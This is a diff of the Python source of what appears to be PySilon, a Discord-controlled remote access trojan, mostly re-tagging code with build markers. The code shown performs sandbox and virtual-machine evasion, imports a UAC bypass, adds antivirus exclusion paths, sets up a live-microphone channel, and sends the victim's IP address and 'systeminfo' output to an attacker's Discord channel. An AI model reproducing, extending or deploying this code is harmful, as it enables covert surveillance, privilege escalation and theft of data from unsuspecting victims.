@@ -20,16 +20,16 @@
 import time
 import os
 
-try: os.mkdir('logs') # [pysilon_mark] !logs
-except: pass # [pysilon_mark] !logs
-logs_file_name = f'executed_at_{time.strftime("%Y-%m-%d_%H-%M-%S")}.log' # [pysilon_mark] !logs
-with open(f'logs/{logs_file_name}', 'w', encoding='utf-8') as create_logs_file: pass # [pysilon_mark] !logs
+try: os.mkdir('logs') # [pysilon_mark] !debug
+except: pass # [pysilon_mark] !debug
+logs_file_name = f'executed_at_{time.strftime("%Y-%m-%d_%H-%M-%S")}.log' # [pysilon_mark] !debug
+with open(f'logs/{logs_file_name}', 'w', encoding='utf-8') as create_logs_file: pass # [pysilon_mark] !debug
 
-def log(entry):  # [pysilon_mark] !logs
-    with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry: log_entry.write(f'[{time.strftime("%Y.%m.%d-%H:%M:%S")}] {entry}\n') # [pysilon_mark] !logs
+def log(entry): # [pysilon_mark] !debug
+    with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry: log_entry.write(f'[{time.strftime("%Y.%m.%d-%H:%M:%S")}] {entry}\n') # [pysilon_mark] !debug
 
 # [pysilon_var] $modules 0
-from resources.protections import protection_check, fake_mutex_code
+from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
 from urllib.request import urlopen
 from resources.uac_bypass import *
 from itertools import islice
@@ -46,8 +46,8 @@ import sys
 import re
 #.log Imported modules
 
-if protection_check():
-    os._exit(0)
+if protection_check(): # [pysilon_mark] !anti-vm
+    os._exit(0) # [pysilon_mark] !anti-vm
 
 if not IsAdmin():
     if GetSelf()[1]:
@@ -91,9 +91,9 @@ guild_id = auto                                                    ##
 ## If you like this project, please leave me a Star on GitHub ;)   ##
 #####################################################################
 
-if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower():
-    os._exit(0)
-#.log Executed fake mutex code check
+if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
+    os._exit(0) # [pysilon_mark] !anti-vm
+#.log Executed fake mutex code check # [pysilon_mark] !anti-vm
 
 if IsAdmin():
     exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
@@ -181,12 +181,14 @@ async def on_ready():
         if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
         #.log Created live microphone channel
 
-        try: await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
+        try: 
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
+            #.log Sent IP address obtained from ident.me
         except: pass
-        #.log Sent IP address obtained from ident.me
-        try: await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
+        try:
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
+            #.log Sent IP address obtained from lafibre.info
         except: pass
-        #.log Sent IP address obtained from lafibre.info
         system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
         #.log Obtained system information
 
